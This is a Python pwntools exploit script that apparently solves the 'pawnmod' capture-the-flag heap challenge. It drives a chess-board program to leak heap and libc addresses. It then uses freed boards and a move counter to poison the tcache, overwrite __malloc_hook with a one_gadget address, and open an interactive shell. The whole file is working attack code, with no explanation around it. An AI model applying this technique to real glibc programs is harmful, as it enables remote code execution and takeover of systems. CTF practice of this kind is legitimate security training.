#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'shell.actf.co', 21706
binary = './pawnmod'
brkpts = '''
'''

elf = ELF("pawnmod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla("Delete Board\n", str(idx))

def add(idx):
    choice(1)
    sla("index?\n", str(idx))

def view(idx):
    choice(2)
    sla("index?\n", str(idx))

def move(idx, a1, a2, b1, b2):
    choice(3)
    sla("index?\n", str(idx))
    sla("spaces.\n", str(a1)+" "+str(a2))
    sla("spaces.\n", str(b1)+" "+str(b2))
    global mov_count
    if "Invalid" not in rl():
        mov_count = mov_count + 1

def move_x(idx, lane, src, dest):
    global mov_count
    while src > dest:
        choice(3)
        sla("index?\n", str(idx))
        sla("spaces.\n", str(lane)+" "+str(src))
        sla("spaces.\n", str(lane)+" "+str(src-1))
        src = src - 1
        if "Invalid" not in rl():
            mov_count = mov_count + 1

def move_y(idx, src, dest, lane):
    global mov_count
    while src < dest:
        choice(3)
        sla("index?\n", str(idx))
        sla("spaces.\n", str(src)+" "+str(lane))
        sla("spaces.\n", str(src+1)+" "+str(lane))
        src = src + 1
        if "Invalid" not in rl():
            mov_count = mov_count + 1

def smite(idx, a1, a2):
    choice(4)
    sla("index?\n", str(idx))
    sla("spaces.\n", str(a1)+" "+str(a2))

def free(idx):
    choice(5)
    sla("index?\n", str(idx))

def move_bishop(idx):
    global even
    if even:
        even = False
        move(idx, 6, 6, 5, 7)
    else:
        even = True
        move(idx, 5, 7, 6, 6)

def getvals(val):
    a = hex(val)
    out = []
    out.append(int("0x"+a[-2:], 16))
    for j in range(-2, -11, -2):
        out.append(int("0x"+a[j-2:j], 16))
    return out
    
global mov_count
global even

if __name__ == "__main__":
    mov_count = 0
    even = True
    add(0)
    add(1)
    add(2)
    add(3)
    add(4)
    free(1)
    free(0)
    view(0)
    rl()
    rl()
    leak = rl()[2:].replace("\n","")
    assert len(leak) == 3
    heap = uu64(leak) - 0x1350
    log.info("Heap -> "+hex(heap))

    move_y(2, 7, 19, 7) #rook -> (19, 7)
    move(2, 6, 7, 7, 5) #knight -> (7, 5)
    move(2, 6, 6, 6, 5) #pawn -> (6, 5)
    move(2, 5, 7, 6, 6) #bishop -> (6, 6)

    #Move king
    move(2, 4, 6, 4, 5)
    move(2, 3, 7, 4, 6) 
    move(2, 4, 6, 5, 7)

    move_y(2, 5, 18, 7) #king -> (18, 7)

    #Pawn clear
    move(2, 5, 6, 5, 5)
    move(2, 3, 6, 3, 5)
    move(2, 2, 6, 2, 5)
    move(2, 1, 6, 1, 5)
    move(2, 0, 6, 0, 5)

    #Move rook
    move(2, 0, 7, 0, 6)
    move(2, 0, 6, 5, 6)
    move(2, 5, 6, 5, 7)
    move_y(2, 5, 17, 7) #rook -> (17, 7)

    while mov_count < 0x3f:
        move_bishop(2)
    smite(2, 18, 7)
    
    move_bishop(2)
    smite(2, 19, 7)
    while mov_count < 0x98:
        move_bishop(2)
    smite(2, 17, 7)

    view(3)
    rl()
    rl()
    libc.address = uu64(rl()[2:].replace("\n","")) - libc.symbols['free']
    log.info("Libc -> "+hex(libc.address))
    malloc_hook = libc.symbols["__malloc_hook"]
    gadget = libc.address + [0xe6c7e, 0xe6c81, 0xe6c84][1]

    add(0)
    add(1)
    move_y(3, 7, 9, 7)
    while mov_count < 0xa1:
        move_bishop(2)
    smite(3, 9, 7)

    free(1)
    free(0)
    free(4)

    for i in range(6):
        move_x(0, i, 6, 0)

    vals = getvals(malloc_hook)

    for idx, i in enumerate(vals):
        count = int("0x"+hex(mov_count)[-2:], 16)
        if count < i:
            while count < i:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            smite(0, idx, 0)
        else:
            while count != 0:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            while count < i:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            smite(0, idx, 0)

    add(1)
    add(0)

    for i in range(8):
        move_x(0, i, 6, 0)
    
    vals = getvals(gadget)

    for idx, i in enumerate(vals):
        count = int("0x"+hex(mov_count)[-2:], 16)
        if count < i:
            while count < i:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            smite(0, idx, 0)
        else:
            while count != 0:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            while count < i:
                move_bishop(2)
                count = int("0x"+hex(mov_count)[-2:], 16)
            smite(0, idx, 0)

    while count != 0:
        move_bishop(2)
        count = int("0x"+hex(mov_count)[-2:], 16)
    smite(0, 6, 0)
    smite(0, 7, 0)

    gdb.attach(io)
    
    add(0)
    
    io.interactive()
